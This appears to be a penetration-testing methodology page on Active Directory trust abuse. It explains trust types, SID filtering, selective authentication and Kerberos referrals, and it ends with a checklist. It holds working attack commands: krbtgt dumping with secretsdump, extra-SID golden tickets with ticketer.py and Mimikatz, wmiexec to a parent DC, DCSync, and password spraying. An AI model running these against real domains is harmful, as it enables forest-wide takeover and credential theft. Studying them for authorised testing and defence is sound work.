# Cross Forest and Trusts

Cross-forest and trust abuse focuses on relationships between Active Directory domains and forests.

A trust can allow identities from one domain or forest to access resources in another domain or forest. The practical impact depends on trust direction, transitivity, SID filtering, selective authentication, Kerberos behavior, group membership, ACLs, and local permissions on target systems.

Common trust scenarios:

- child domain to parent domain
- parent domain to child domain
- domain to domain inside the same forest
- external trust to another domain
- forest trust to another forest
- resource forest access
- legacy trust with weak filtering
- trust key compromise
- cross-domain Kerberos ticket abuse

Useful resources:

- [The Hacker Recipes - Trusts](https://www.thehacker.recipes/ad/movement/trusts/)
- [The Hacker Recipes - Kerberos Across Trusts](https://www.thehacker.recipes/ad/movement/trusts/)
- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [Microsoft Learn - How Domain and Forest Trusts Work](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10))
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [WADComs](https://wadcoms.github.io/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export DOMAIN_DN='DC=corp,DC=local'
export DOMAIN_SID='S-1-5-21-1111111111-2222222222-3333333333'

export CHILD_DOMAIN=dev.corp.local
export CHILD_NETBIOS=DEV
export CHILD_DC=dc01.dev.corp.local
export CHILD_DC_IP=10.10.20.10
export CHILD_SID='S-1-5-21-4444444444-5555555555-6666666666'

export PARENT_DOMAIN=corp.local
export PARENT_NETBIOS=CORP
export PARENT_DC=dc01.corp.local
export PARENT_DC_IP=10.10.10.10
export PARENT_SID='S-1-5-21-1111111111-2222222222-3333333333'

export TRUSTED_DOMAIN=partner.local
export TRUSTED_DC=dc01.partner.local
```

## Trust Basics

A trust is a relationship that allows authentication from one domain to be accepted by another domain.

Trusts do not automatically mean full access. They only create an authentication path. Authorization still depends on ACLs, group membership, local groups, resource permissions, SID filtering, selective authentication, and logon rights.

Trust direction is the most important concept.

| Trust direction | Meaning |
| --- | --- |
| Inbound trust | The other domain trusts users from this domain. |
| Outbound trust | This domain trusts users from the other domain. |
| Bidirectional trust | Both domains trust each other. |

Another way to think about direction:

```text
If Domain A trusts Domain B,
users from Domain B may be able to access resources in Domain A.
```

Common trust types:

| Trust type | Notes |
| --- | --- |
| Parent-child | Automatic trust between parent and child domains in same forest. |
| Tree-root | Trust between domain trees in the same forest. |
| External | Trust with a domain outside the forest. |
| Forest | Trust between two forests. |
| Shortcut | Optimizes authentication between domains in the same forest. |
| Realm | Trust with a non-Windows Kerberos realm. |

Trust transitivity:

| Type | Meaning |
| --- | --- |
| Transitive | Trust may extend beyond the directly trusted domain. |
| Non-transitive | Trust applies only between the two domains. |

Enumerate trusts with Windows tools:

```cmd
nltest /domain_trusts
nltest /trusted_domains
```

Get domain controllers:

```cmd
nltest /dclist:corp.local
nltest /dsgetdc:corp.local
```

PowerView trust enumeration:

```powershell
Get-DomainTrust
Get-DomainTrustMapping
Get-Forest
Get-ForestDomain
Get-ForestTrust
```

AD module:

```powershell
Get-ADTrust -Filter *
Get-ADForest
Get-ADDomain
```

LDAP trusted domain objects:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" \
cn flatName trustPartner trustDirection trustType trustAttributes securityIdentifier
```

Useful trust fields:

| Field | Meaning |
| --- | --- |
| `trustPartner` | Trusted domain or forest. |
| `flatName` | NetBIOS name. |
| `trustDirection` | Inbound, outbound, or bidirectional. |
| `trustType` | Trust type. |
| `trustAttributes` | Trust flags. |
| `securityIdentifier` | SID of trusted domain. |

Trust direction values often seen in LDAP output:

| Value | Meaning |
| --- | --- |
| `1` | Inbound |
| `2` | Outbound |
| `3` | Bidirectional |

Trust type values often seen in LDAP output:

| Value | Meaning |
| --- | --- |
| `1` | Downlevel / legacy |
| `2` | Active Directory domain |
| `3` | MIT Kerberos realm |
| `4` | DCE |

Common trust attributes:

| Attribute concept | Meaning |
| --- | --- |
| Non-transitive | Trust does not extend beyond direct relationship. |
| Forest transitive | Forest trust behavior. |
| Within forest | Trust is inside the same forest. |
| Treat as external | Forest trust treated more like external trust. |
| Quarantined domain | SID filtering / quarantine behavior. |
| Selective authentication | Users need explicit `Allowed to Authenticate`. |

Basic cross-domain access test:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN
```

Test with UPN:

```bash
nxc smb $TARGET -u "$USER@$DOMAIN" -p "$PASS"
```

Kerberos cross-domain access usually requires correct DNS and SPNs:

```bash
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

## Forest Trusts

A forest trust is a trust between two AD forests.

Forest trusts can be one-way or two-way. They are usually transitive between the forests, but access still depends on authorization and forest trust settings.

Forest trust use cases:

| Use case | Example |
| --- | --- |
| Company merger | `corp.local` trusts `partner.local`. |
| Resource forest | User accounts in one forest access resources in another. |
| Administrative separation | Separate forests for security boundaries. |
| Cross-organization application access | App servers in one forest accept users from another. |

Enumerate forest information:

```powershell
Get-Forest
Get-ForestDomain
Get-ForestTrust
```

AD module:

```powershell
Get-ADForest
Get-ADTrust -Filter *
```

LDAP forest trust enumeration:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" \
cn trustPartner trustDirection trustType trustAttributes flatName securityIdentifier
```

Check domains in current forest:

```powershell
(Get-ADForest).Domains
```

PowerView trust mapping:

```powershell
Get-DomainTrustMapping
```

Test DNS for trusted forest:

```bash
dig @$DC_IP $TRUSTED_DOMAIN
dig @$DC_IP _ldap._tcp.dc._msdcs.$TRUSTED_DOMAIN SRV
dig @$DC_IP _kerberos._tcp.$TRUSTED_DOMAIN SRV
```

Resolve trusted forest DC:

```bash
host $TRUSTED_DC $DC_IP
```

Test SMB access across forest:

```bash
nxc smb $TRUSTED_DC -u "$USER@$DOMAIN" -p "$PASS"
```

Test LDAP access across forest:

```bash
nxc ldap $TRUSTED_DC -u "$USER@$DOMAIN" -p "$PASS"
```

Kerberos with ccache:

```bash
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

Access target in trusted forest:

```bash
nxc smb $TRUSTED_DC -k --use-kcache
```

Forest trust settings to inspect:

| Setting | Why it matters |
| --- | --- |
| Direction | Determines which users may authenticate where. |
| Selective authentication | Requires explicit authentication permission on target computers. |
| SID filtering | Blocks many foreign SIDs. |
| Name suffix routing | Controls which UPN/DNS suffixes route through forest trust. |
| Transitivity | Forest trust can allow broad authentication paths. |

Forest trust attack surface:

| Finding | Possible path |
| --- | --- |
| Bidirectional forest trust | Test access both ways. |
| No selective authentication | Broader authentication surface. |
| Weak SID filtering behavior | SID-based abuse may be possible in some cases. |
| Admins reused across forests | Credential reuse path. |
| Local admin across forest resources | Lateral movement path. |
| Shared service accounts | Kerberoasting or credential reuse path. |
| AD CS across forest | Certificate-based access path. |

## External Trusts

An external trust is a trust between domains in different forests, or with legacy domains.

External trusts are usually non-transitive.

They may be used for:

| Use case | Example |
| --- | --- |
| Legacy domain access | Old NT/AD domain trust. |
| Business partner access | One domain trusts another domain. |
| Migration period | Temporary access between domains. |
| Application access | Users from one domain access app resources in another. |

Enumerate trusts:

```cmd
nltest /domain_trusts
```

PowerView:

```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

AD module:

```powershell
Get-ADTrust -Filter *
```

LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" \
cn flatName trustPartner trustDirection trustType trustAttributes securityIdentifier
```

External trust indicators:

| Field | Indicator |
| --- | --- |
| Non-transitive | Common external trust behavior. |
| Trust type | AD domain or legacy trust. |
| Trust partner | Specific external domain. |
| Direction | Determines access direction. |
| SID filtering / quarantine | Often enabled for external trusts. |

Test authentication to external trusted resource:

```bash
nxc smb $TARGET -u "$USER@$DOMAIN" -p "$PASS"
```

Test with NetBIOS format:

```bash
nxc smb $TARGET -u "$NETBIOS\\$USER" -p "$PASS"
```

Test LDAP if reachable:

```bash
nxc ldap $TRUSTED_DC -u "$USER@$DOMAIN" -p "$PASS"
```

Common external trust abuse areas:

| Finding | Possible path |
| --- | --- |
| Local group membership granted to foreign users | Access to servers/resources. |
| Foreign security principals | Cross-domain group membership. |
| Weak SID filtering | SID injection paths in old or weak configurations. |
| Shared local admin password | Lateral movement. |
| Same admin passwords across domains | Credential reuse. |
| Trust account key compromise | Inter-domain Kerberos path. |

Foreign Security Principals container:

```text
CN=ForeignSecurityPrincipals,DC=corp,DC=local
```

LDAP query:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=ForeignSecurityPrincipals,$DOMAIN_DN" "(objectClass=foreignSecurityPrincipal)" \
cn objectSid
```

Find groups containing foreign security principals:

```powershell
Get-DomainGroup | ForEach-Object {
    Get-DomainGroupMember -Identity $_.samaccountname
} | Where-Object {$_.MemberName -match "S-1-5-21"}
```

## SID Filtering

SID filtering controls whether SIDs from outside a trust are accepted.

It is designed to prevent users from one domain from injecting privileged SIDs from another domain into their token.

SID filtering matters for:

- SID history
- extra SID in forged Kerberos tickets
- child-to-parent escalation
- external trusts
- forest trusts
- migration scenarios

Common SID-related concepts:

| Concept | Meaning |
| --- | --- |
| Object SID | SID assigned to an AD object. |
| Domain SID | SID prefix shared by objects in a domain. |
| RID | Last part of a SID. |
| SID history | Previous SID values carried by an account. |
| Extra SID | Additional SID added to forged Kerberos ticket. |
| SID filtering | Trust behavior that filters foreign SIDs. |

Check SID history:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(sIDHistory=*)" \
sAMAccountName objectSid sIDHistory
```

PowerView:

```powershell
Get-DomainObject -LDAPFilter "(sIDHistory=*)"
Get-DomainUser -LDAPFilter "(sIDHistory=*)" -Properties sidhistory
```

Check trust attributes:

```powershell
Get-ADTrust -Filter * -Properties *
```

PowerView:

```powershell
Get-DomainTrust
```

`netdom` can show SID filtering state when available:

```cmd
netdom trust corp.local /domain:partner.local /quarantine
```

Common SID filtering states:

| State | Meaning |
| --- | --- |
| Enabled / quarantined | Foreign SIDs are filtered. |
| Disabled / not quarantined | Some foreign SIDs may be accepted. |
| Forest-aware filtering | Forest trust uses forest-specific SID filtering behavior. |
| Selective authentication separate | SID filtering is not the same as selective authentication. |

Extra SID Golden Ticket example in a lab:

```bash
ticketer.py -nthash KRBTGT_NT_HASH \
-domain-sid $CHILD_SID \
-domain $CHILD_DOMAIN \
-extra-sid ${PARENT_SID}-519 \
Administrator
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
```

Validate parent access:

```bash
wmiexec.py -k -no-pass $CHILD_DOMAIN/Administrator@$PARENT_DC
```

Common blockers:

| Blocker | Effect |
| --- | --- |
| SID filtering enabled | Extra SID may be removed or ignored. |
| Wrong SID | Ticket authenticates but does not authorize. |
| Trust direction wrong | Authentication path fails. |
| Selective authentication | Authentication allowed only to selected computers. |
| Protected target | Local or resource ACL blocks access. |

## Selective Authentication

Selective authentication is a trust setting that restricts which users from a trusted domain can authenticate to computers in the trusting domain.

Without selective authentication, trusted users may be able to authenticate broadly, though access still depends on authorization.

With selective authentication, trusted users need explicit permission:

```text
Allowed to Authenticate
```

on the target computer object.

Where it matters:

| Scenario | Effect |
| --- | --- |
| Forest trust | Often used to restrict cross-forest access. |
| External trust | Can restrict partner/legacy access. |
| Resource forest | Controls which external users can authenticate to servers. |
| High-security forest | Limits broad cross-forest auth. |

Check trust properties:

```powershell
Get-ADTrust -Filter * -Properties *
```

PowerView:

```powershell
Get-DomainTrust
```

Look for selective authentication indicators in trust attributes.

Check `Allowed to Authenticate` style rights with BloodHound or ACL tools.

PowerView ACL query for a target computer:

```powershell
Get-DomainObjectAcl -Identity "TARGETCOMPUTER$" -ResolveGUIDs
```

LDAP target computer:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(sAMAccountName=TARGETCOMPUTER$)" \
distinguishedName nTSecurityDescriptor
```

Test access to a target across trust:

```bash
nxc smb $TARGET -u "$USER@$TRUSTED_DOMAIN" -p "$PASS"
```

Test Kerberos access:

```bash
getTGT.py $TRUSTED_DOMAIN/$USER:"$PASS" -dc-ip TRUSTED_DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
nxc smb $TARGET_HOST -k --use-kcache
```

Common results:

| Result | Meaning |
| --- | --- |
| Authentication denied broadly | Selective authentication may be enabled. |
| Authentication works only on specific hosts | User may have `Allowed to Authenticate` only there. |
| Authentication works but access denied | Auth allowed, resource authorization missing. |
| SMB access fails but LDAP works | Protocol or target-specific access issue. |

Important distinction:

| Control | Meaning |
| --- | --- |
| Selective authentication | Controls whether foreign users can authenticate to target computers. |
| SID filtering | Controls whether foreign SIDs are accepted through trust. |
| ACLs | Control access to objects/resources after authentication. |
| Local groups | Control local administrative/resource rights. |

## Kerberos Across Trusts

Kerberos across trusts uses referral tickets.

When a user from one domain accesses a service in another trusted domain, the KDC can issue referral tickets that point the client toward the trusted domain.

Simplified flow:

```text
User gets TGT in home domain
User requests service in trusted domain
Home KDC returns referral TGT
Client contacts trusted domain KDC
Trusted KDC issues service ticket
Client accesses target service
```

Important Kerberos objects:

| Object | Meaning |
| --- | --- |
| Home domain TGT | TGT from user's own domain. |
| Referral TGT | Ticket referring client to trusted domain. |
| Inter-realm key | Trust key between domains/forests. |
| Service ticket | Ticket for final service SPN. |
| PAC | Authorization data. |

Get TGT in source domain:

```bash
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$USER.ccache
klist
```

Access target service in trusted domain:

```bash
nxc smb $TARGET_HOST -k --use-kcache
```

Impacket Kerberos:

```bash
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET_HOST
```

Request service ticket:

```bash
getST.py -spn cifs/$TARGET_HOST $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

Inspect tickets:

```bash
klist
```

Windows:

```cmd
klist
```

Rubeus:

```powershell
Rubeus.exe triage
Rubeus.exe klist
```

Common Kerberos cross-trust errors:

| Error | Possible meaning |
| --- | --- |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN not found or wrong domain. |
| `KDC_ERR_WRONG_REALM` | Client should contact different realm/domain. |
| `KRB_AP_ERR_MODIFIED` | SPN/key mismatch. |
| `KRB_AP_ERR_SKEW` | Time sync issue. |
| `KDC_ERR_POLICY` | Policy or trust restriction. |
| `Access denied` | Authentication worked but authorization failed. |

DNS requirements:

```bash
dig @$DC_IP _kerberos._tcp.$TRUSTED_DOMAIN SRV
dig @$DC_IP _ldap._tcp.dc._msdcs.$TRUSTED_DOMAIN SRV
host $TARGET_HOST $DC_IP
```

SPN checks:

```bash
setspn -Q cifs/target.partner.local
```

LDAP SPN search:

```bash
ldapsearch -x -H ldap://$TRUSTED_DC -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=partner,DC=local" "(servicePrincipalName=cifs/target.partner.local)" \
sAMAccountName servicePrincipalName
```

Kerberos across trust abuse areas:

| Finding | Possible path |
| --- | --- |
| Trust key compromise | Inter-realm ticket forging. |
| Weak SID filtering | Extra SID ticket abuse. |
| Shared service account | Kerberoasting or credential reuse. |
| Foreign user in privileged group | Cross-domain authorization path. |
| Local admin rights across trust | Lateral movement. |
| Selective authentication disabled | Broader auth surface. |

## Child to Parent Escalation

Child-to-parent escalation targets movement from a compromised child domain to the parent or forest root domain.

In classic lab environments, this can involve forging a ticket in the child domain with an extra SID from the parent domain, such as Enterprise Admins.

Common requirements:

| Requirement | Notes |
| --- | --- |
| Child domain compromise | Usually child `krbtgt` key or equivalent. |
| Child domain SID | Needed for forged child ticket. |
| Parent domain SID | Needed for extra SID. |
| Parent privileged SID | Often `PARENT_SID-519` for Enterprise Admins. |
| Trust path | Parent-child trust must exist. |
| SID filtering behavior | Determines whether extra SID is honored. |

Enumerate child and parent SIDs:

```powershell
Get-DomainSID -Domain dev.corp.local
Get-DomainSID -Domain corp.local
```

LDAP object SID:

```bash
ldapsearch -x -H ldap://$CHILD_DC_IP -D "$CHILD_NETBIOS\\$USER" -w "$PASS" \
-b "DC=dev,DC=corp,DC=local" "(objectClass=domainDNS)" objectSid
```

Dump child `krbtgt`:

```bash
secretsdump.py $CHILD_DOMAIN/$USER:"$PASS"@$CHILD_DC_IP -just-dc-user krbtgt
```

Create ticket with extra SID:

```bash
ticketer.py -nthash CHILD_KRBTGT_NT_HASH \
-domain-sid $CHILD_SID \
-domain $CHILD_DOMAIN \
-extra-sid ${PARENT_SID}-519 \
Administrator
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
```

Validate access to parent DC:

```bash
wmiexec.py -k -no-pass $CHILD_DOMAIN/Administrator@$PARENT_DC
```

Validate DCSync against parent only when explicitly allowed:

```bash
secretsdump.py -k -no-pass $CHILD_DOMAIN/Administrator@$PARENT_DC -just-dc-user krbtgt
```

Mimikatz equivalent:

```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:dev.corp.local /sid:CHILD_DOMAIN_SID /krbtgt:CHILD_KRBTGT_HASH /sids:PARENT_DOMAIN_SID-519 /ptt
```

Common privileged SID suffixes:

| SID suffix | Meaning |
| --- | --- |
| `-519` | Enterprise Admins. |
| `-512` | Domain Admins. |
| `-518` | Schema Admins. |
| `-520` | Group Policy Creator Owners. |

Common blockers:

| Blocker | Effect |
| --- | --- |
| SID filtering | Extra SID may be filtered. |
| Wrong trust direction assumption | Authentication path fails. |
| Wrong parent SID | Ticket lacks useful privilege. |
| Wrong child `krbtgt` key | Ticket invalid. |
| DNS or SPN issue | Kerberos access fails. |
| Time skew | Ticket rejected. |

## Trust Attack Checklist

- [ ] **Confirm current domain context**

  ```cmd
  whoami
  whoami /groups
  nltest /dsgetdc:corp.local
  ```

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  ```

- [ ] **Enumerate trusts**

  ```cmd
  nltest /domain_trusts
  nltest /trusted_domains
  ```

  ```powershell
  Get-DomainTrust
  Get-DomainTrustMapping
  Get-ForestTrust
  Get-ForestDomain
  ```

  ```powershell
  Get-ADTrust -Filter *
  ```

- [ ] **Query trusted domain objects over LDAP**

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" \
  cn flatName trustPartner trustDirection trustType trustAttributes securityIdentifier
  ```

- [ ] **Identify trust direction**

  ```text
  Inbound:
  Outbound:
  Bidirectional:
  Unknown:
  ```

- [ ] **Identify trust type**

  ```text
  Parent-child:
  Tree-root:
  External:
  Forest:
  Shortcut:
  Realm:
  ```

- [ ] **Check transitivity**

  ```text
  Transitive:
  Non-transitive:
  Forest transitive:
  Within forest:
  ```

- [ ] **Check SID filtering**

  ```powershell
  Get-ADTrust -Filter * -Properties *
  ```

  ```cmd
  netdom trust corp.local /domain:partner.local /quarantine
  ```

- [ ] **Check selective authentication**

  ```powershell
  Get-ADTrust -Filter * -Properties *
  Get-DomainTrust
  ```

  ```powershell
  Get-DomainObjectAcl -Identity "TARGETCOMPUTER$" -ResolveGUIDs
  ```

- [ ] **Check foreign security principals**

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "CN=ForeignSecurityPrincipals,$DOMAIN_DN" "(objectClass=foreignSecurityPrincipal)" \
  cn objectSid
  ```

- [ ] **Test basic cross-trust authentication**

  ```bash
  nxc smb $TARGET -u "$USER@$DOMAIN" -p "$PASS"
  nxc ldap $TRUSTED_DC -u "$USER@$DOMAIN" -p "$PASS"
  ```

- [ ] **Test Kerberos across trust**

  ```bash
  getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
  export KRB5CCNAME=$PWD/$USER.ccache
  klist
  nxc smb $TARGET_HOST -k --use-kcache
  ```

- [ ] **Check DNS and SPN resolution**

  ```bash
  dig @$DC_IP _kerberos._tcp.$TRUSTED_DOMAIN SRV
  dig @$DC_IP _ldap._tcp.dc._msdcs.$TRUSTED_DOMAIN SRV
  host $TARGET_HOST $DC_IP
  ```

- [ ] **Check SID history**

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "$DOMAIN_DN" "(sIDHistory=*)" \
  sAMAccountName objectSid sIDHistory
  ```

- [ ] **Check child-to-parent prerequisites**

  ```text
  Child domain:
  Parent domain:
  Child SID:
  Parent SID:
  Child krbtgt:
  Parent privileged SID:
  SID filtering status:
  ```

- [ ] **Validate child-to-parent path only in lab or explicit scope**

  ```bash
  ticketer.py -nthash CHILD_KRBTGT_NT_HASH \
  -domain-sid $CHILD_SID \
  -domain $CHILD_DOMAIN \
  -extra-sid ${PARENT_SID}-519 \
  Administrator
  ```

  ```bash
  export KRB5CCNAME=$PWD/Administrator.ccache
  wmiexec.py -k -no-pass $CHILD_DOMAIN/Administrator@$PARENT_DC
  ```

- [ ] **Check for credential reuse across domains or forests**

  ```bash
  nxc smb targets.txt -u $USER -p "$PASS" --continue-on-success
  nxc winrm targets.txt -u $USER -p "$PASS" --continue-on-success
  ```

- [ ] **Check local admin rights across trust**

  ```bash
  nxc smb trusted_targets.txt -u "$USER@$DOMAIN" -p "$PASS"
  nxc winrm trusted_targets.txt -u "$USER@$DOMAIN" -p "$PASS"
  ```
